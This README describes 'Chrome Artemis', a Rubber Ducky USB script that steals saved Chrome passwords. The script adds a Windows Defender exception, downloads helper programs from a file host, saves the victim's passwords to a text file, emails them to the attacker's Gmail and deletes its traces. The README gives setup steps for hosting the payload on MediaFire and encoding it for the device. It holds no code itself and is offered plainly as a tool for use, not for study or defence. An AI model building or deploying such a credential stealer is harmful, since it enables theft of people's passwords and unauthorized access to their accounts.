**Chrome Artemis** is a script built for the Ruber Ducky that collects saved passwords from a machine and emails them to your Gmail address!

What **Chrome Artemis** does:

  - Makes and exception in Windows Denfender
  - Downloads the required programs
  - Saves passwords to a .txt file
  - Email the .txt file to your Gmail account
  - Deletes downloaded programs

You can also:
  - Modify the script so it sends the .txt to a server via FTP.
  - Anything you really want


## Installation

- Open _**Chrome.ps1_** and replace _**YOUR GMAIL HERE_** with your Gmail address.
- Upload the _**Chrome.ps1_** to a file sharing service such as MediaFire.
- Open _**Script.txt_**
- Replace _**REPLACE THIS WITH .ps1 FILE LINK!_** with your MediaFire Download link for Chrome.ps1.
- Save your **.txt** and encode it for Rubber Ducky.
- Put the encoded **.bin** on your Ducky!

You don't need Twin Duck! All files are downloaded from the web. Just modify and encode the **Script.txt** and drop the encoded .bin to your Ducky!


## Usage

Just plug in the Rubber Ducky and wait. After the script runs, it'll lock the user's screen and delete the downloaded files.
